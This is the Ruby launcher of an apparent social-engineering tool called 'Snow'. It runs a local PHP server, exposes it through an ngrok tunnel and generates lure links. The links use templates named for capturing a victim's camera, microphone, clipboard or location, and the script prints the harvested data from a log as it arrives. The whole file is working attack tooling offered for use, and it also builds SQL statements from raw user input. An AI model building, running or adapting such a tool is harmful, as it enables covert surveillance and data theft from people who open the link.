#!/usr/bin/env ruby
" Snow : https://github.com/msfpt/Snow "

require 'ngrok/tunnel';
require 'io/console';
require 'tty-prompt';
require 'net/http';
require 'sqlite3';
require 'uri';

def os
  if RUBY_PLATFORM =~ /win32/ ;return "windows";
  elsif RUBY_PLATFORM =~ /linux/ ;return "linux";
  elsif RUBY_PLATFORM =~ /darwin/ ;return "mac_os_x";
  elsif RUBY_PLATFORM =~ /freebsd/ ;return "freebsd";
  else return "unknown";end
end

case os
  when 'windows', 'freebsd', 'unknown'
    $stderr.puts("Snow may not support this OS")
    exit true
end

if Process.uid != 0
  $stderr.puts("Permission denied -> \asudo ./Snow.rb")
  exit true
end

class App
  def initialize
    @title = "Snow"
    @prompt = TTY::Prompt.new(interrupt: :signal, symbols: {marker: "→"}, active_color: :cyan);
    @log = "template/data.log";
    begin
      @db = SQLite3::Database.new 'config.db' # ':memory:'
      @db.results_as_hash = true;
      @db.execute "CREATE TABLE data(port INTEGER, ngrok_token TEXT)";
      @db.execute "INSERT INTO data (port, ngrok_token) VALUES (6060, '')";
    rescue SQLite3::Exception => error
    # ensure @db.close if @db
    end
  end
  def run opt = nil
    self.setTitle @title
    self.banner
    (opt == nil) ? self.options_main : opt
    if opt != nil 
      case opt
      when '--newlink', '-n'
        self.new_link
      when '--settings', '--setting', '-s'
        self.setting
      when '--help', '-h'
        self.help
      else
        for value in ARGV do
          $stderr.puts "This is wrong -> #{value}\n"
          exit true
        end
      end
    end
    
  end
  def setTitle(title);system((if os == "linux"; "printf \"\033]0;%s\007\"" ;elsif os == "windows"; "title '%s'" ;end) % [title]);end
  def online
    begin;Net::HTTP.get(URI("https://www.google.com/"));return true
    rescue SocketError ;return false;end
  end
  def clear;system(if os == "linux"; "clear" ;elsif os == "windows"; "cls" ;end);end
  def banner
    self.clear;
    tw = $stdout.winsize[1] # or -> require 'tty-screen'; TTY::Screen.width;
    puts ' '+("-"*(tw-2));
    printf (' '*(tw-18))+"\e[0;m\e[2m(Ctrl+C to quit)\e[0;m\e[36;1m
  ,---.                                
  '   .-'  ,--,--,   ,---.  ,--.   ,--. 
  `.  `-.  |      \\ | .-. | |  |.'.|  | 
  .-'    | |  ||  | ' '-' ' |   .'.   | 
  `-----'  `--''--'  `---'  '--'   '--' \r\e[0;m\n\n";
    sleep 0.3
  end
  def options_main 
    while true
      data  = @prompt.select(" Choose a option:", ['New Link', 'Settings', 'Help']);
      STDOUT.print "\r\n"
      case data
        when 'New Link'
          self.new_link
        when 'Settings'
          self.setting
        when 'Help'
          self.help
        else
          next
      end
    end
  end
  def new_link
    
    if !self.online
      $stderr.puts("\r  please connect to internet \n\n")
      return nil
    end

    if(!File.file?(@log)) 
      File.open(@log, 'w') { |file| file.write('') }
    end

    template = @prompt.select(" choose a template:", ['Default', 'Access Camera', 'Access Microphone', 'Access ClipBoard', 'Get Location', 'Back']);
    @template_status = true

    case template
      when 'Default'
        type_link = "Default"
        template_dir = 'template/default'
        template_code = ''
      when 'Access Camera'
        type_link = "Access Camera"
        template_dir = 'template/camera'
        template_code = '?s=x1q'
      when 'Access Microphone'
        type_link = "Access Microphone"
        template_dir = 'template/microphone'
        template_code = '?s=r9b'
      when 'Access ClipBoard'
        type_link = "Access ClipBoard"
        template_dir = 'template/clipboard'
        template_code = '?s=y4t'
      when 'Get Location'
        type_link = "Get Location"
        template_dir = 'template/location'
        template_code = '?s=h3d'
      else
        @template_status = false
        self.options_main
    end

    if @template_status
      begin
        self.banner

        @db.execute "select * from data" do |data|

          IO.popen "php -S 127.0.0.1:#{data['port']} -t template > /dev/null 2>&1";
          Ngrok::Tunnel.start port: data['port'], authtoken: data['ngrok_token'], log: '.ngrok.log';
          ngrok_link = Ngrok::Tunnel.ngrok_url_https+template_code;
          puts "\n  link \e[0;90m:\e[0;92m #{ngrok_link}\e[0;m"
        end
        
        fsize = File.size @log
        while true
          lfsize = File.size @log
          sleep 1.2
          if fsize != lfsize
            fsize = File.size @log

            df = File.read(@log).split('&')
            dt = df[df.size-1]
              
            puts "\e[0;96m#{dt}\e[0;m"
          end
  
        end
      rescue Exception => error
        if Ngrok::Tunnel.running?;Ngrok::Tunnel.stop;end
        IO.popen 'killall php > /dev/null 2>&1'
        STDOUT.print "\r\n"
      rescue Ngrok::Error => error
        puts error
        if Ngrok::Tunnel.running?;Ngrok::Tunnel.stop;end
        $stderr.puts("\n\r  check that ngrok_token is correct or change it \n")
        IO.popen 'killall php > /dev/null 2>&1'
        STDOUT.print "\r\n"
      end
    end
    sleep 0.2

  end
  def setting
    opt_setting = @prompt.select(" choose a setting:", %w(Token Port Back));
    STDOUT.print "\r\n"
    @db.execute "select * from data" do |data|
      case opt_setting
        when 'Token'
    
          begin
            ngrok_token = data['ngrok_token'].strip;
          rescue Exception => e
            ngrok_token = '';
          end
  
          ngrok_token = (ngrok_token=='') ? 'null' : ngrok_token
  
          puts "   Current token : "+ngrok_token+"\n\n"
          status = @prompt.yes?("  Do you change this?")
          if status
            printf "\n  get token from ngrok.com\n\n";
            new_ngrok_token = @prompt.ask("  Say new token:")
            @db.execute "UPDATE data SET ngrok_token='#{new_ngrok_token}'"
          end
  
        when 'Port'
    
          begin
            port = data['port'].to_s.strip;
          rescue Exception => error
            port = '';
          end
  
          port = (port=='') ? 'null' : port
          bot_chat_id = (bot_chat_id=='') ? 'null' : bot_chat_id
  
  
          puts "   Current token : "+port+"\n"
          status = @prompt.yes?("  Do you change these?")
          if status
            printf "\n  port must be closed and correct. \n";
            begin
              new_port = @prompt.ask("  Say new port:", convert: :int)
              @db.execute "UPDATE data SET port='#{new_port}'"
            rescue Exception => error
              puts error
              $stderr.puts("\n\r  type error \n");
            end
          end
        when 'Back'
          self.options_main
      end
    end
    STDOUT.print "\r\n"
    sleep 0.2
    self.setting
  end
  def help
    puts "  Read at https://github.com/msfpt/Snow#readme\n\n"
    self.options_main
  end
end

begin
  Snow = App. new
  opt = (ARGV.size > 0) ? ARGV[0].downcase : nil
  Snow.run opt
rescue Interrupt => error
  puts "\r\n\n";
  exit true
rescue Exception => error
  puts error
end